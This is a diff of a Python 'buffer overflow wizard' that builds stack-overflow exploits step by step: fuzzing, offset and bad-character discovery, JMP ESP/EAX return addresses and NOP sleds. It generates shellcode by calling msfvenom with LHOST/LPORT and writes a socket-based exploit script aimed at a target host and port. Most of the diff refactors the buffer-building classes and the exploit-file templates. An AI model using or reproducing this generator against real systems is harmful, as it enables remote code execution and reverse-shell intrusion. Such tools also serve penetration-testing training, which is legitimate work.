@@ -6,7 +6,7 @@
 # Based on this, the exploit file will be created and updated.
 # =============================================================================
 # Author  : nosce
-# Date    : January 2020
+# Date    : February 2020
 # License : MIT
 # Status  : Prototype
 # =============================================================================
@@ -22,6 +22,7 @@ import os
 import re
 import shlex
 import shutil
+import textwrap
 import socket as so
 import subprocess as sub
 from binascii import unhexlify
@@ -31,7 +32,7 @@ from fileinput import FileInput
 # Global variables and constants
 # -----------------------------------------------------------------------------
 _DEFAULT_POOL = ThreadPoolExecutor()
-# Formatting for messages
+# Formatting for messages -----------------------------------------------------
 BOLD = '\033[1m'
 GREEN = '\033[32m'
 YELLOW = '\033[33m'
@@ -39,7 +40,10 @@ RED = '\033[31m'
 GRAY = '\033[37m'
 CYAN = '\033[36m'
 FORMAT_END = '\033[0m'
+BLUE_BACK = '\x1b[0;30;44m'
+BACK_END = '\x1b[0m'
 
+# Buffer overflow values ------------------------------------------------------
 # Global
 bo_type = 'local'
 current_step = -1
@@ -64,8 +68,8 @@ pattern_length = 2000
 buf_length = 2000
 offset = 1000
 badchars = []
-nop_sled = 24
-nop_padding = 24
+nop_sled = 16
+nop_padding = 16
 return_address = struct.pack('<L', 0x12345678)
 # Payload
 arch = 'x86'
@@ -100,45 +104,65 @@ class GenericBuffer:
 	"""
 	Basic Buffer sending an A-B-C payload, e.g for testing offsets
 	"""
-	number = 0
-	description = 'Simple A-B-C buffer'
-	select_text = 'None of these'
-	payload_size = buf_length - offset - 4 - len(start_command) - len(end_command)
+
+	def __init__(self):
+		self.id = 0
+		self.name = 'generic'
+		self.selectable = True
+		self.description = 'Simple A-B-C buffer'
+		self.select_text = 'None of these'
+		self.payload_size = buf_length - offset - 4 - len(start_command) - len(end_command)
+		self.buffer = b''
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b"A" * offset  # Overflow
-		buffer += b"B" * 4  # EIP content
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
+		self.buffer = start_command
+		self.buffer += b"A" * offset  # Overflow
+		self.buffer += b"B" * 4  # EIP content
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		return self.buffer
 
 	def get_input(self):
-		print_error('Sorry! In this case the wizard cannot build the right buffer automatically. '
-					'Please use the raw exploit file and modify it to your needs manually.')
+		print_error('Sorry! In this case, the wizard cannot build the right buffer automatically. '
+					'Please use the raw exploit file and modify it manually according your needs.')
+
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'A' * offset  
+buffer += b'B' * 4 
+buffer += b'C' * (buf_length - len(buffer) - len({end}))
+buffer += {end}		
+""".format(start=start_command,
+		   end=end_command)
 
 
 class ESPBuffer:
 	"""
 	Buffer which contains the payload after the return address. A JMP ESP command should be used as return address.
 	"""
-	number = 1
-	description = 'Buffer with payload in stack and JMP ESP'
-	select_text = 'The Top of Stack and following memory has been overwritten with Cs (ESP points to Cs)'
-	payload_size = buf_length - len(start_command) - offset - 4 - nop_sled - len(end_command)
+
+	def __init__(self):
+		self.id = 1
+		self.name = 'esp'
+		self.selectable = True
+		self.description = 'Buffer with payload in stack and JMP ESP'
+		self.select_text = 'The Top of Stack and following memory has been overwritten with Cs (ESP points to Cs)'
+		self.payload_size = buf_length - len(start_command) - offset - 4 - nop_sled - len(end_command)
+		self.buffer = b''
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b"A" * offset
-		buffer += return_address
-		buffer += b'\x90' * nop_sled
-		buffer += payload_code
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
-		if len(buffer) > buf_length:
-			print_warning('The buffer with payload is larger than the originally defined buffer length. '
+		self.buffer = start_command
+		self.buffer += b"A" * offset
+		self.buffer += return_address
+		self.buffer += b'\x90' * nop_sled
+		self.buffer += payload_code
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		if len(self.buffer) > buf_length:
+			print_warning('The buffer with payload is larger than the originally defined buffer length.\n'
 						  'Check whether the exploit still runs properly.')
+		return self.buffer
 
 	def get_input(self):
 		print_info('Use the debugger to search for a JMP ESP address (e.g. Immunity Debugger: !mona jmp -r ESP)')
@@ -148,29 +172,50 @@ class ESPBuffer:
 		global return_address
 		return_address = struct.pack('<L', int(user_input, 16))
 
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'A' * offset	
+buffer += b'{retr}'  # Return address
+buffer += b'{nop_char}' * {nop}	 # NOP sled
+buffer += b'{payload}'
+buffer += b'C' * (buf_length - len(buffer) - len({end}))  # Padding
+buffer += {end}		
+""".format(start=start_command,
+		   retr=hex_to_print(return_address),
+		   nop_char=hex_to_print(b'\x90'),
+		   nop=nop_sled,
+		   payload=hex_to_print(payload_code),
+		   end=end_command)
+
 
 class EAXBuffer:
 	"""
 	Buffer which contains the payload before the return address. Should be used if EAX points to first part of buffer.
 	A JMP EAX command should be used as payload.
 	"""
-	number = 2
-	description = 'Buffer with payload in EAX and JMP EAX'
-	select_text = 'The Top of Stack has not been overwritten; EAX points to As'
-	payload_size = offset - nop_sled - nop_padding
+
+	def __init__(self):
+		self.id = 2
+		self.name = 'eax'
+		self.selectable = True
+		self.description = 'Buffer with payload in EAX and JMP EAX'
+		self.select_text = 'The Top of Stack has not been overwritten; EAX points to As'
+		self.payload_size = offset - nop_sled - nop_padding
+		self.buffer = b''
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b'\x90' * nop_sled
-		buffer += payload_code
-		buffer += b'\x90' * (offset - len(buffer))
-		buffer += return_address
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
-		if len(buffer) > buf_length:
+		self.buffer = start_command
+		self.buffer += b'\x90' * nop_sled
+		self.buffer += payload_code
+		self.buffer += b'\x90' * (offset - len(self.buffer))
+		self.buffer += return_address
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		if len(self.buffer) > buf_length:
 			print_warning('The buffer with payload is larger than the originally defined buffer length. '
 						  'Check whether the exploit still runs properly.')
+		return self.buffer
 
 	def get_input(self):
 		print_info('Use the debugger to search for a JMP EAX address (e.g. Immunity Debugger: !mona jmp -r EAX)')
@@ -180,28 +225,49 @@ class EAXBuffer:
 		global return_address
 		return_address = struct.pack('<L', int(user_input, 16))
 
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'{nop_char}' * {nop}  # NOP
+buffer += b'{payload}'
+buffer += b'{nop_char}' * (offset - len(buffer))  # Padding
+buffer += b'{retr}'  # Return address
+buffer += b'C' * (buf_length - len(buffer) - len({end}))
+buffer += {end}		
+""".format(start=start_command,
+		   nop_char=hex_to_print(b'\x90'),
+		   nop=nop_sled,
+		   payload=hex_to_print(payload_code),
+		   retr=hex_to_print(return_address),
+		   end=end_command)
+
 
 class FixedAddressBuffer:
 	"""
 	Buffer which contains the payload before the return address. Expects a fixed address which points to payload.
 	"""
-	number = 3
-	description = 'Buffer with payload before EIP and pointer to fixed address'
-	select_text = 'The Top of Stack has not been overwritten but contains a fixed address which points to As'
-	payload_size = offset - nop_sled - nop_padding
+
+	def __init__(self):
+		self.id = 3
+		self.name = 'fixed'
+		self.selectable = True
+		self.description = 'Buffer with payload before EIP and pointer to fixed address'
+		self.select_text = 'The Top of Stack has not been overwritten but contains a fixed address which points to As'
+		self.payload_size = offset - nop_sled - nop_padding
+		self.buffer = b''
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b'\x90' * nop_sled
-		buffer += payload_code
-		buffer += b'\x90' * (offset - len(buffer))
-		buffer += return_address
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
-		if len(buffer) > buf_length:
+		self.buffer = start_command
+		self.buffer += b'\x90' * nop_sled
+		self.buffer += payload_code
+		self.buffer += b'\x90' * (offset - len(self.buffer))
+		self.buffer += return_address
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		if len(self.buffer) > buf_length:
 			print_warning('The buffer with payload is larger than the originally defined buffer length. '
 						  'Check whether the exploit still runs properly.')
+		return self.buffer
 
 	def get_input(self):
 		show_prompt_text('Enter the address shown in the Top of Stack:')
@@ -209,53 +275,177 @@ class FixedAddressBuffer:
 		global return_address
 		return_address = struct.pack('<L', int(user_input, 16))
 
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'{nop_char}' * {nop}  # NOP
+buffer += b'{payload}'
+buffer += b'{nop_char}' * (offset - len(buffer))  # Padding
+buffer += b'{retr}'  # Return address
+buffer += b'C' * (buf_length - len(buffer) - len({end}))
+buffer += {end}		
+""".format(start=start_command,
+		   nop_char=hex_to_print(b'\x90'),
+		   nop=nop_sled,
+		   payload=hex_to_print(payload_code),
+		   retr=hex_to_print(return_address),
+		   end=end_command)
+
+
+class PatternBuffer:
+	"""
+	Buffer which contains a unique pattern for determining the offset
+	"""
+
+	def __init__(self):
+		self.id = 4
+		self.name = 'pattern'
+		self.selectable = False
+		self.description = 'Buffer with pattern'
+		self.buffer = b''
+		self.pattern = b''
+
+	def get_buffer(self, pattern):
+		self.pattern = pattern
+		self.buffer = start_command
+		self.buffer += pattern
+		self.buffer += end_command
+		return self.buffer
+
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += {pattern}
+buffer += {end}		
+""".format(start=start_command,
+		   pattern=self.pattern,
+		   end=end_command)
+
 
 class BadCharCBuffer:
 	"""
 	Buffer which contains all ASCII characters after the return address
 	"""
-	number = 4
-	description = 'Buffer with bad chars after EIP (in Cs)'
-	select_text = 'Enough space in stack for payload'
+
+	def __init__(self):
+		self.id = 5
+		self.name = 'badcharc'
+		self.selectable = False
+		self.description = 'Buffer with bad chars after EIP (in Cs)'
+		self.select_text = 'Enough space in stack for payload'
+		self.buffer = b''
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b"A" * offset
-		buffer += b"B" * 4
-		buffer += char_string
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
-		if len(buffer) > buf_length:
+		self.buffer = start_command
+		self.buffer += b"A" * offset
+		self.buffer += b"B" * 4
+		self.buffer += char_string
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		if len(self.buffer) > buf_length:
 			print_warning('The buffer with all ascii characters is larger than the originally defined buffer length. '
 						  'Check whether the exploit still runs properly.')
+		return self.buffer
+
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'A' * offset
+buffer += b'B' * 4
+buffer += b'{chars}'
+buffer += b'C' * (buf_length - len(buffer) - len({end}))
+buffer += {end}		
+""".format(start=start_command,
+		   chars=hex_to_print(char_string),
+		   end=end_command)
 
 
 class BadCharABuffer:
 	"""
 	Buffer which contains all ASCII characters before the return address
 	"""
-	number = 4
-	description = 'Buffer with bad chars before EIP (in As)'
-	select_text = 'Not enough space in stack for payload'
+
+	def __init__(self):
+		self.id = 6
+		self.name = 'badchara'
+		self.selectable = False
+		self.description = 'Buffer with bad chars before EIP (in As)'
+		self.select_text = 'Not enough space in stack for payload'
+		self.buffer = b""
 
 	def get_buffer(self):
-		global buffer
-		buffer = start_command
-		buffer += b"A" * nop_sled
-		buffer += char_string
-		buffer += b"A" * (offset - len(buffer))
-		buffer += b"B" * 4
-		buffer += b"C" * (buf_length - len(buffer) - len(end_command))
-		buffer += end_command
-		if len(buffer) > buf_length:
+		self.buffer = start_command
+		self.buffer += b"A" * nop_sled
+		self.buffer += char_string
+		self.buffer += b"A" * (offset - len(self.buffer))
+		self.buffer += b"B" * 4
+		self.buffer += b"C" * (buf_length - len(self.buffer) - len(end_command))
+		self.buffer += end_command
+		if len(self.buffer) > buf_length:
 			print_warning('The buffer with all ascii characters is greater than the originally defined buffer length. '
 						  'Check whether the exploit still runs properly.')
+		return self.buffer
+
+	def print_buffer(self):
+		return """
+buffer = {start}
+buffer += b'A' * {nop}
+buffer += b'{chars}'
+buffer += b'A' * (offset - len(buffer))
+buffer += b'B' * 4
+buffer += b'C' * (buf_length - len(buffer) - len({end}))
+buffer += {end}		
+""".format(start=start_command,
+		   nop=nop_sled,
+		   chars=hex_to_print(char_string),
+		   end=end_command)
 
 
-selected_buffer = 0
-bad_char_buffer = BadCharCBuffer()
-buf_types = [GenericBuffer(), ESPBuffer(), EAXBuffer(), FixedAddressBuffer()]
+class BufferTypes:
+	"""
+	Handles all available buffer types
+	"""
+
+	def __init__(self):
+		self.buf_types = [
+			GenericBuffer(),
+			ESPBuffer(),
+			EAXBuffer(),
+			FixedAddressBuffer(),
+			PatternBuffer(),
+			BadCharCBuffer(),
+			BadCharABuffer()
+		]
+		self.selected_buffer = None
+
+	def get_buffer_by_name(self, name):
+		for buf in self.buf_types:
+			if name == buf.name:
+				self.selected_buffer = buf
+				return buf
+
+	def get_buffer_by_id(self, buf_id):
+		for buf in self.buf_types:
+			if buf_id == buf.id:
+				self.selected_buffer = buf
+				return buf
+
+	def get_selectable_buffers(self):
+		selectable = list()
+		for buf in self.buf_types:
+			if buf.selectable:
+				selectable.append(buf)
+		return selectable
+
+
+def hex_to_print(hex_string):
+	if len(hex_string) == 0:
+		return ""
+	return "\\x" + "\\x".join(a + b for a, b in zip(hex_string.hex()[::2], hex_string.hex()[1::2]))
+
+
+# Init buffer list
+buffer_list = BufferTypes()
 
 
 # -----------------------------------------------------------------------------
@@ -529,12 +719,11 @@ def step_pattern():
 	# Proceed if pattern creation was successful
 	if thread.result() == 0:
 		print()
+		# Buffer ----------------------------------
 		with open(tmp_file, 'r') as f:
-			# Buffer ----------------------------------
-			global buffer
-			buffer = start_command
-			buffer += f.read().splitlines()[0].encode()
-			buffer += end_command
+			pattern = f.read().splitlines()[0].encode()
+		global buffer
+		buffer = buffer_list.get_buffer_by_name('pattern').get_buffer(pattern)
 		# -----------------------------------------
 		os.unlink(tmp_file)
 		print('The exploit file will be generated. The following settings will be used:\n')
@@ -619,7 +808,8 @@ def step_offsets():
 							   'Seems that the overflow did not overwrite the stack. We will deal with that later.')
 		os.unlink(tmp_file)
 		# Create check file ---------------------------------------
-		buf_types[0].get_buffer()
+		global buffer
+		buffer = buffer_list.get_buffer_by_name('generic').get_buffer()
 		if bo_type == 'local':
 			dump_local_exploit()
 		elif bo_type == 'remote':
@@ -651,7 +841,8 @@ def step_badchars():
 	{}'''.format(GRAY, FORMAT_END))
 	all_chars_found = False
 	while not all_chars_found:
-		bad_char_buffer.get_buffer()
+		global buffer
+		buffer = buffer_list.get_buffer_by_name('badcharc').get_buffer()
 		if bo_type == 'local':
 			dump_local_exploit()
 		elif bo_type == 'remote':
@@ -689,8 +880,9 @@ def step_return():
 	current_step = 4
 	show_step_banner('[4] Finding return address')
 	show_prompt_text('Examine the buffer overflow in the debugger. Which case does apply?')
+	buf_types = buffer_list.get_selectable_buffers()
 	for b in buf_types:
-		show_prompt_text('[ ' + str(b.number) + ' ] ' + b.select_text, False)
+		show_prompt_text('[ ' + str(b.id) + ' ] ' + b.select_text, False)
 	# Wait for user selection
 	while True:
 		user_input = int(get_input(number_valid))
@@ -698,12 +890,10 @@ def step_return():
 			break
 		print_warning('The number you entered is invalid')
 	# Handle selected buffer type
-	for b in buf_types:
-		if b.number == user_input:
-			b.get_input()
-			b.get_buffer()
-			global selected_buffer
-			selected_buffer = user_input
+	selected = buffer_list.get_buffer_by_id(user_input)
+	selected.get_input()
+	global buffer
+	buffer = selected.get_buffer()
 	if bo_type == 'local':
 		dump_local_exploit()
 	elif bo_type == 'remote':
@@ -779,7 +969,7 @@ def step_payload():
 def create_payload():
 	"""Creates a palyoad with msfvenom and updates the buffer"""
 	tmp_file = 'payload.py'
-	payload_size = buf_types[selected_buffer].payload_size
+	payload_size = buffer_list.selected_buffer.payload_size
 	command = "msfvenom -a {arch} --platform {plat} -p {pay} LHOST={host} LPORT={port} EXITFUNC=thread -s {size} -b '{bad}' -f py -v payld -o {file}".format(
 		arch=shlex.quote(arch),
 		plat=shlex.quote(platform),
@@ -800,10 +990,11 @@ def create_payload():
 		global payload_code
 		payload_code = payld
 		# Remove temporary file and folder
-		os.unlink(tmp_file)
+		# os.unlink(tmp_file)
 		shutil.rmtree('__pycache__', ignore_errors=True)
 		# Update buffer with payload
-		buf_types[selected_buffer].get_buffer()
+		global buffer
+		buffer = buffer_list.selected_buffer.get_buffer()
 		print_info('Buffer has been updated with new payload')
 		if len(payload_code) > payload_size:
 			print_warning(
@@ -834,6 +1025,7 @@ def bo_type_valid(user_input):
 	"""Accepts certain string variants for local / remote"""
 	if user_input in ['l', 'r', 'loc', 'rem', 'local', 'remote']:
 		return True
+	print_error("Invalid buffer overflow type. Only 'local' or 'remote' are possible.")
 	return False
 
 
@@ -841,6 +1033,7 @@ def ext_valid(user_input):
 	"""Accepts a string with a maximum length of 20 as file extension"""
 	if user_input.startswith('.') or len(user_input) > 20 or ' ' in user_input:
 		return False
+	print_error("Invalid input. Enter the extension without preceding dot. Maximum length is 20.")
 	return True
 
 
@@ -862,8 +1055,10 @@ def port_valid(user_input):
 		if 0 <= port_no <= 65535:
 			return True
 		else:
+			print_error("Invalid port number.")
 			return False
 	except ValueError:
+		print_error("Invalid port number.")
 		return False
 
 
@@ -880,6 +1075,7 @@ def number_valid(user_input):
 		number = int(user_input)
 		return True
 	except ValueError:
+		print_error("Invalid number.")
 		return False
 
 
@@ -887,6 +1083,7 @@ def pattern_valid(user_input):
 	"""The Metasploit pattern is alphanumeric, so the EIP value as well"""
 	if len(user_input) == 8 and user_input.isalnum():
 		return True
+	print_error("Invalid pattern. The pattern mus be an 8-bit hex value.")
 	return False
 
 
@@ -900,6 +1097,7 @@ def bad_char_valid(user_input):
 			return True
 		except ValueError:
 			return False
+	print_error("Invalid character. Enter the hex value: 00 0a etc.")
 	return False
 
 
@@ -911,6 +1109,7 @@ def address_valid(user_input):
 			return True
 		except ValueError:
 			return False
+	print_error("Invalid memory address. Must be an 3-bit hex value.")
 	return False
 
 
@@ -918,12 +1117,14 @@ def payload_valid(user_input):
 	"""Accepts a string matching the basic format 'platform/payload'"""
 	if len(user_input.split('/')) >= 2 or user_input == 'show payloads' or user_input == '':
 		return True
+	print_error("Invalid payload. Use 'show payloads' to show valid payloads.")
 	return False
 
 
 def arch_valid(user_input):
 	if user_input in ['64', '86', '']:
 		return True
+	print_error("Invalid atchitecture. Enter 64 or 86.")
 	return False
 
 
@@ -931,6 +1132,7 @@ def platform_valid(user_input):
 	"""Msfvenom platforms are words with a maximum length of 10"""
 	if (len(user_input) <= 10 and user_input.isalpha()) or user_input == '':
 		return True
+	print_error("Invalid platform type")
 	return False
 
 
@@ -938,6 +1140,7 @@ def check_text(user_input):
 	"""Accepts any string without numbers or special characters"""
 	if user_input.isalpha() or user_input == '':
 		return True
+	print_error("Invalid input")
 	return False
 
 
@@ -959,6 +1162,8 @@ def get_input(check_function):
 	user_input = ''
 	while not input_ok:
 		user_input = input(show_prompt())
+		# Print empty line after input
+		print()
 		# Handle specific user input
 		if user_input.lower() in ['exit', 'quit']:
 			exit(0)
@@ -1005,6 +1210,70 @@ def proceed_ok():
 	return False
 
 
+def set_step(value):
+	"""
+	Opens the given step
+	:param value: (int) Step
+	"""
+	try:
+		number = int(value)
+		if 0 < number > 5:
+			raise ValueError
+		global current_step
+		current_step = number
+		steps = [step_fuzzing, step_pattern, step_offsets, step_badchars, step_return, step_payload]
+		steps[number]()
+	except ValueError:
+		print_error('Invalid input. You can only select step 0 to 5.')
+		return False
+
+
+def set_command(user_input, command_type):
+	"""
+	Sets the start or end command to the value provided by the user
+	:param user_input: 		(string) Value the user entered
+	:param command_type: 	(string) Type of command: 'start' or 'end'
+	"""
+	global start_command
+	global end_command
+	global pattern_length
+	value = user_input.split(' ')[2:]
+	command = ' '.join(v for v in value)
+	# Handle binary input differently
+	if command.startswith('b"'):
+		command = command.lstrip('b"')
+		command = command.rstrip('"')
+		raw = ''.join(c for c in command.split('\\x'))
+		if command_type == 'start':
+			start_command = unhexlify(raw)
+		else:
+			end_command = unhexlify(raw)
+	else:
+		command = command.lstrip('"')
+		command = command.rstrip('"')
+		if command_type == 'start':
+			start_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
+		else:
+			end_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
+	# Recalc pattern length
+	pattern_length = pattern_length - len(start_command) - len(end_command)
+
+
+def set_badchars(user_input):
+	"""
+	Adds the entered value(s) to the list of bad characters
+	:param user_input:
+	"""
+	global badchars
+	value = user_input.split(' ')[2:]
+	badchars.clear()
+	for v in value:
+		if bad_char_valid(v):
+			badchars.append(v)
+		else:
+			print_error('Could not add {} to bad characters: Invalid value'.format(v))
+
+
 def set_option(user_input):
 	"""
 	Sets a parameter to given value based on the user input
@@ -1022,51 +1291,15 @@ def set_option(user_input):
 	if parameter == 'step':
 		set_step(value)
 	elif parameter == 'command':
-		value = user_input.split(' ')[2:]
-		command = ' '.join(v for v in value)
-		# Handle binary input differently
-		if command.startswith('b"'):
-			command = command.lstrip('b"')
-			command = command.rstrip('"')
-			raw = ''.join(c for c in command.split('\\x'))
-			start_command = unhexlify(raw)
-		else:
-			command = command.lstrip('"')
-			command = command.rstrip('"')
-			start_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
-		# Recalc pattern length
-		pattern_length = pattern_length - len(start_command) - len(end_command)
+		set_command(user_input, 'start')
 	elif parameter == 'end_command':
-		value = user_input.split(' ')[2:]
-		command = ' '.join(v for v in value)
-		# Handle binary input differently
-		if command.startswith('b"'):
-			command = command.lstrip('b"')
-			command = command.rstrip('"')
-			raw = ''.join(c for c in command.split('\\x'))
-			end_command = unhexlify(raw)
-		else:
-			command = command.lstrip('"')
-			command = command.rstrip('"')
-			end_command = command.encode().replace(b'\\r', b'\r').replace(b'\\n', b'\n').replace(b'\\t', b'\t')
-		# Recalc pattern length
-		pattern_length = pattern_length - len(start_command) - len(end_command)
+		set_command(user_input, 'end')
 	elif parameter == 'badchars':
-		value = user_input.split(' ')[2:]
-		global badchars
-		badchars.clear()
-		for v in value:
-			if bad_char_valid(v):
-				badchars.append(v)
-			else:
-				print_error('Could not add {} to bad characters: Invalid value'.format(v))
-		print(badchars)
+		set_badchars(user_input)
 	elif parameter == 'type':
 		if bo_type_valid(value):
 			global bo_type
 			bo_type = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'filename':
 		global file_name
 		file_name = value
@@ -1074,124 +1307,72 @@ def set_option(user_input):
 		if ext_valid(value):
 			global file_ext
 			file_ext = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'target':
 		if ip_valid(value):
 			global target
 			target = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'lhost':
 		if ip_valid(value):
 			global connect_ip
 			connect_ip = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'port':
 		if port_valid(value):
 			global port
 			port = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'lport':
 		if port_valid(value):
 			global connect_port
 			connect_port = value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'fuzz_length':
 		if number_valid(value):
 			global fuzz_buff_length
 			fuzz_buff_length = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'fuzz_increase':
 		if number_valid(value):
 			global increase_step
 			increase_step = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'fuzz_char':
 		if value.isalnum() and len(value) == 1:
 			global fuzz_char
 			fuzz_char = value.encode()
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'pattern':
 		if number_valid(value):
 			pattern_length = int(value) - len(start_command) - len(end_command)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'buffer_length':
 		if number_valid(value):
 			global buf_length
 			buf_length = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'offset':
 		if number_valid(value):
 			global offset
 			offset = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'nop_sled':
 		if number_valid(value):
 			global nop_sled
 			nop_sled = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'nop_padding':
 		if number_valid(value):
 			global nop_padding
 			nop_padding = int(value)
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'return':
 		if address_valid(value):
 			global return_address
 			return_address = struct.pack('<L', int(value, 16))
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'payload':
 		if payload_valid(value):
 			global payload
 			payload = value
 			create_payload()
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'arch':
 		if arch_valid(value):
 			global arch
 			arch = 'x' + value
-		else:
-			print_error('Invalid value for this parameter')
 	elif parameter == 'platform':
 		if platform_valid(value):
 			global platform
 			platform = value
-		else:
-			print_error('Invalid value for this parameter')
 	else:
 		print_error('Invalid parameter')
-
-
-def set_step(value):
-	"""
-	Opens the given step
-	:param value: (int) Step
-	"""
-	try:
-		number = int(value)
-		if 0 < number > 5:
-			raise ValueError
-		global current_step
-		current_step = number
-		steps = [step_fuzzing, step_pattern, step_offsets, step_badchars, step_return, step_payload]
-		steps[number]()
-	except ValueError:
-		print_error('Invalid input. You can only select step 0 to 5.')
-		return False
 
 
 # -----------------------------------------------------------------------------
@@ -1360,36 +1541,63 @@ def show_ascii():
 # -----------------------------------------------------------------------------
 # Print formatted output to the console
 # -----------------------------------------------------------------------------
+def print_message(type, message):
+	types = {
+		'error': {'color': RED, 'sign': '!'},
+		'success': {'color': GREEN, 'sign': '*'},
+		'warning': {'color': YELLOW, 'sign': '!'},
+		'info': {'color': GRAY, 'sign': 'i'}
+	}
+	lines = message.split('\n')
+	for i in range(len(lines)):
+		# One line message ------------------
+		if len(lines) == 1:
+			print("{color}[{sign}] {line}{end}".format(**types[type], line=lines[i], end=FORMAT_END))
+			break
+		# Multi-line message ----------------
+		# First line with sign
+		if i == 0:
+			print("{color}[{sign}] {line}".format(**types[type], line=lines[i]))
+		# Last line with format end
+		elif i == len(lines) - 1:
+			print("    {line}{end}".format(line=lines[i], end=FORMAT_END))
+		# Other lines indented
+		else:
+			print("    {line}".format(line=lines[i]))
+
+
 def print_error(message):
-	print(RED, '[!] ', message, FORMAT_END)
+	print_message('error', message)
 
 
 def print_success(message):
-	print(GREEN, '[*] ', message, FORMAT_END)
+	print_message('success', message)
 
 
 def print_warning(message):
-	print(YELLOW, '[!] ', message, FORMAT_END)
+	print_message('warning', message)
 
 
 def print_info(message):
-	print(GRAY, '[i] ', message, FORMAT_END)
+	print_message('info', message)
 
 
 def show_prompt():
 	if current_step >= 0:
-		prompt = '\n{}{}wizard ({} | {}) > {}'.format(BOLD, CYAN, bo_type, current_step, FORMAT_END)
+		prompt = '\n{}wizard ({} | {}) >{} '.format(BLUE_BACK, bo_type, current_step, BACK_END)
 	else:
-		prompt = '\n{}{}wizard > {}'.format(BOLD, CYAN, FORMAT_END)
+		prompt = '\n{}wizard >{} '.format(BLUE_BACK, BACK_END)
 	return prompt
 
 
 def show_prompt_text(text, show_lines=True):
-	prompt_len = len(show_prompt())
-	if show_lines:
-		print(' ' * (prompt_len - 19), '░▒▓', text)
-	else:
-		print(' ' * (prompt_len - 15), text)
+	lines = textwrap.wrap(text, width=80)
+	prompt_len = len(show_prompt()) - len(BLUE_BACK) - len(BACK_END)
+	for line in lines:
+		if show_lines:
+			print(' ' * (prompt_len - 6), '░▒▓', line)
+		else:
+			print(' ' * (prompt_len - 2), line)
 
 
 def show_step_banner(title):
@@ -1539,7 +1747,7 @@ def dump_remote_exploit():
 	Writes a python file with the exploit based on the currently set parameters
 	"""
 	global file
-	content = '''\
+	content = """\
 #!/usr/bin/python3
 import socket as so
 
@@ -1549,9 +1757,9 @@ port = {port}
 # ------------------------------------------
 
 # --- Define exploit ------------------------
-buf_length = {buffer}
+buf_length = {buffer_length}
 offset = {off}
-buffer = {buffer_code}
+{buffer_code}
 # ------------------------------------------
 
 with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
@@ -1583,14 +1791,14 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 			exit(1)
 	except (BrokenPipeError, ConnectionResetError):
 		print('[!] The connection was closed while sending the payload')
-'''.format(target=target,
+""".format(target=target,
 		   port=port,
-		   buffer=buf_length,
+		   buffer_length=buf_length,
 		   off=offset,
-		   buffer_code=buffer)
+		   buffer_code=buffer_list.selected_buffer.print_buffer())
 	try:
-		with open(file, 'w') as f:
-			f.write(content)
+		with open(file, 'wb') as f:
+			f.write(content.encode())
 		print_success('Created exploit file {}'.format(file))
 	except OSError as ex:
 		print_error('Error while creating the exploit file:\n {}'.format(ex.strerror))
@@ -1605,8 +1813,12 @@ def update_remote_exploit():
 		with FileInput(files=[file], inplace=True) as f:
 			for line in f:
 				line = line.rstrip()
-				if line.startswith('buffer = '):
-					line = 'buffer = {}'.format(buffer)
+				if line.startswith('offset = '):
+					line = "offset = " + str(offset)
+				elif line.startswith('buffer = '):
+					line = buffer_list.selected_buffer.print_buffer()
+				elif line.startswith('buffer += ') or len(line) == 0:
+					continue
 				print(line)
 		print_success('Updated buffer in exploit file {}'.format(file))
 	except OSError as ex:
